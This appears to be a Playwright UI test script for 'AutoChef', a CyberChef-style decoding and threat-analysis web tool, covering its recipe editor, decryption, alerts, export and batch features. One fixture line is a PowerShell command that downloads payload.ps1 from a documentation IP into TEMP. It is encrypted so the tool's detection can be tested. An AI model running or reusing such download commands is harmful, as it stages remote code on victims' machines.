/**
 * Browser test of the web UI (Playwright + Chromium):
 *  - the recipe editor re-bakes as soon as an operation or argument changes
 *  - "Run recipe" bakes on demand when auto-bake is off
 *  - disabling a step, and errors pointing at the failing step
 *  - the Keys field: a password-encrypted OpenSSL string is decrypted with the typed password
 *   node test/ui/editor.spec.mjs        (starts the server on a free port)
 */
import { spawn } from "node:child_process";
import crypto from "node:crypto";
import path from "node:path";
import fs from "node:fs";
import os from "node:os";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";
// Playwright is a dev tool: installed globally or as a devDependency (npm i -D playwright)
const { chromium } = createRequire(import.meta.url)("playwright");

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const PORT = 8600 + Math.floor(Math.random() * 300);
// AUTOCHEF_URL: test an already running site instead (e.g. the browser edition, see test/browser/run-browser.mjs)
const BASE = process.env.AUTOCHEF_URL || `http://127.0.0.1:${PORT}/`;
const srv = process.env.AUTOCHEF_URL ? null : spawn(process.execPath, ["server.mjs"], { cwd: ROOT, env: { ...process.env, PORT: String(PORT), AUTOCHEF_LIBRARY: path.join(os.tmpdir(), `autochef-ui-lib-${process.pid}.json`) }, stdio: ["ignore", "pipe", "inherit"] });
if (srv) await new Promise(r => srv.stdout.on("data", d => String(d).includes("running") && r()));

let pass = 0, fail = 0;
const check = (name, ok, extra = "") => { console.log(`${ok ? "PASS" : "FAIL"}  ${name}${extra ? "  " + extra : ""}`); ok ? pass++ : fail++; };
const browser = await chromium.launch();
const page = await browser.newPage();
page.on("pageerror", e => check("no JavaScript errors", false, e.message));
await page.goto(BASE);
await page.waitForFunction(() => document.querySelector("#go"), null, { timeout: 60000 });
const out = () => page.locator("#editorOut").textContent();
const waitOut = async (pred, ms = 15000) => { const t = Date.now(); while (Date.now() - t < ms) { const o = await out(); if (pred(o)) return o; await page.waitForTimeout(100); } return await out(); };

// 1. analysis fills the editor
await page.fill("#input", Buffer.from("Hello from AutoChef editor test").toString("base64"));
await page.click("#go");
let o = await waitOut(x => x.includes("Hello from AutoChef"));
check("analysis opens the editor with the found recipe", o.includes("Hello from AutoChef"));

// 2. change the operation name -> output changes at once (no blur / no button)
const opInput = page.locator("#steps .step .opname").first();
await opInput.fill("To Hex");
o = await waitOut(x => /^[0-9a-f]{2}( [0-9a-f]{2})+/.test(x.trim()));
check("typing a new operation re-bakes immediately", /^[0-9a-f]{2}( [0-9a-f]{2})+/.test(o.trim()), o.slice(0, 40));

// 3. typed argument widgets: change the delimiter option of To Hex
const sel = page.locator("#steps .step select").first();
await sel.selectOption("Colon");
o = await waitOut(x => x.includes(":"));
check("changing an option argument re-bakes immediately", o.includes(":"), o.slice(0, 40));

// 4. add an operation, then disable it
await page.click("#addStep");
await page.locator("#steps .step .opname").nth(1).fill("ROT13");
await page.waitForTimeout(800);
const before = await out();
await page.locator("#steps .step .en").nth(1).uncheck();
o = await waitOut(x => x !== before);
check("disabling a step re-bakes without it", o !== before && o.includes(":"));

// 5. auto-bake off -> nothing changes until Run recipe
await page.locator("#steps .step .en").nth(1).check();
await page.waitForTimeout(800);
await page.uncheck("#edAuto");
await page.locator("#steps .step .opname").first().fill("From Base64");
await page.waitForTimeout(800);
const stale = await out();
await page.click("#edRun");
o = await waitOut(x => x !== stale);
check("Run recipe applies the edited recipe on demand", o !== stale && o.includes("Uryyb sebz NhgbPurs"), o.slice(0, 40));
await page.check("#edAuto");

// 5b. undo brings back the previous recipe; step outputs show each step's result
const beforeUndo = await page.locator("#steps .step .opname").first().inputValue();
await page.locator("#steps .step .opname").first().fill("To Hex");
await page.waitForTimeout(900);
await page.click("#edUndo");
await page.waitForTimeout(900);
check("undo restores the previous operation", (await page.locator("#steps .step .opname").first().inputValue()) === beforeUndo, beforeUndo);
await page.check("#edSteps");
let pv = 0;
for (let i = 0; i < 40 && pv < 2; i++) { await page.waitForTimeout(250); pv = await page.locator("#steps .steppv").count(); }
check("step outputs show the result after every step", pv >= 2, `${pv} step previews`);
await page.uncheck("#edSteps");

// 6. error points at the failing step
await page.locator("#steps .step .opname").nth(1).fill("AES Decrypt"); // no key -> CyberChef error
let bad = 0;
for (let i = 0; i < 60 && !bad; i++) { await page.waitForTimeout(250); bad = await page.locator('#steps .step.bad[data-i="1"]').count(); }
const info = await page.locator("#editorInfo").textContent();
const msg = await page.locator('#steps .step[data-i="1"] .steperr').textContent();
check("the failing step is marked with CyberChef's error", bad === 1 && /step 2/.test(info), `${info} · ${msg.slice(0, 50)}`);

// 7. Keys field: OpenSSL "Salted__" string decrypted with the typed password
const pt = "Invoke-WebRequest -Uri http://203.0.113.9/payload.ps1 -OutFile $env:TEMP\\p.ps1";
const salt = crypto.randomBytes(8), km = crypto.pbkdf2Sync("infected", salt, 10000, 48, "sha256");
const c = crypto.createCipheriv("aes-256-cbc", km.subarray(0, 32), km.subarray(32));
const ct = Buffer.concat([Buffer.from("Salted__"), salt, c.update(pt), c.final()]).toString("base64");
await page.fill("#input", ct);
await page.fill("#keys", "infected");
await page.click("#go");
const t0 = Date.now();
let top = "";
while (Date.now() - t0 < 30000) { top = await page.locator("#results .res").first().textContent().catch(() => ""); if (top.includes("payload.ps1")) break; await page.waitForTimeout(250); }
check("password in the Keys field decrypts OpenSSL/CryptoJS data", top.includes("payload.ps1"), top.slice(0, 80).replace(/\s+/g, " "));

// 7b. threat-intel export menu and batch dialog exist
check("export menu offers STIX, MISP, Sigma and YARA", (await page.locator("#tiExport option").allTextContents()).join("|").match(/STIX.*MISP.*Sigma.*YARA/) !== null);

// 8. findings: alert panel and highlighted indicators
const alertsShown = await page.locator("#results .alerts").count();
const marks = await page.locator("#results mark.hl.high").count();
check("findings raise an alert and are highlighted in the output", alertsShown === 1 && marks >= 1 && (await page.locator("#results mark.hl.high").first().textContent()).includes("203.0.113.9"), `${marks} high-level highlights`);

// 9. save a recipe to the team library from a result card, see it in the library, delete it
await page.locator('#results .res button[data-act="save"]').first().click();
await page.fill("#svName", "UI test entry");
await page.click("#svSave");
await page.waitForTimeout(1200);
await page.click("#libBtn");
await page.waitForTimeout(800);
const listed = (await page.locator("#teamList").textContent()).includes("UI test entry");
page.once("dialog", d => d.accept());
await page.locator('#teamList button[data-del]').first().click();
await page.waitForTimeout(800);
check("save to team library, listed, deleted", listed && !(await page.locator("#teamList").textContent()).includes("UI test entry"));
await page.locator("#libDlg button", { hasText: "Close" }).click();

// 10. batch: two files in one go
const tdir = fs.mkdtempSync(path.join(os.tmpdir(), "acb-"));
fs.writeFileSync(path.join(tdir, "a.txt"), Buffer.from("Batch file one: http://198.51.100.20/x").toString("base64"));
fs.writeFileSync(path.join(tdir, "b.txt"), Buffer.from("Batch file two").toString("hex"));
await page.click("#batchBtn");
await page.setInputFiles("#batchFiles", [path.join(tdir, "a.txt"), path.join(tdir, "b.txt")]);
await page.fill("#batchTime", "4");
await page.click("#batchGo");
let rows = 0;
for (let i = 0; i < 120 && rows < 3; i++) { await page.waitForTimeout(250); rows = await page.locator("#batchTbl tr").count(); }
check("batch analyses several files and offers reports", rows === 3 && !(await page.locator("#batchExp").isHidden()), `${rows - 1} rows`);
await page.locator("#batchDlg button", { hasText: "Close" }).click();

await page.screenshot({ path: path.join(ROOT, "test", "ui", "editor-screenshot.png"), fullPage: true });
await browser.close();
if (srv) srv.kill();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
